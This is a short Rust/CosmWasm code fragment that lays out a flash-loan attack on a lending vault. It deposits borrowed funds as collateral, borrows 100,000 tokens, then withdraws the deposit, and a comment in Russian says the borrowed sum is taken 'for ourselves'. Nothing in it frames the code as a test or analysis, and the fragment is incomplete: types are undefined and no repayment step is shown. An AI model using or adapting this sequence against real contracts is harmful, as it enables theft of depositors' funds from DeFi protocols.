use cosmwasm_std::{to_binary, CosmMsg, WasmMsg, Coin, Uint128};

// Contract addresses (for example)
let vault_address = "cosmos1_ghost_vault_addr";
let flash_loan_source = "cosmos1_flash_loan_provider";

// 1. FLASH LOAN AMOUNT (e.g., 500,000 tokens)
let flash_amount = Uint128::new(500_000_000_000); 

// STEP 1: DEPOSIT (Increase liquidity)
let deposit_msg = WasmMsg::Execute {
    contract_addr: vault_address.to_string(),
    msg: to_binary(&ExecuteMsg::Deposit {})?,
    funds: vec![Coin { denom: "uatom".to_string(), amount: flash_amount }],
};

// STEP 2: LOAN (We take out a loan at a rate of 0.1%)
let borrow_amount = Uint128::new(100_000_000_000); // Берем 100к себе
let borrow_msg = WasmMsg::Execute {
    contract_addr: vault_address.to_string(),
    msg: to_binary(&ExecuteMsg::Borrow { amount: borrow_amount })?,
    funds: vec![],
};

// STEP 3: WITHDRAWAL (We take back the flash loan)
let withdraw_msg = WasmMsg::Execute {
    contract_addr: vault_address.to_string(),
    msg: to_binary(&ExecuteMsg::Withdraw { amount: flash_amount })?,
    funds: vec![],
};
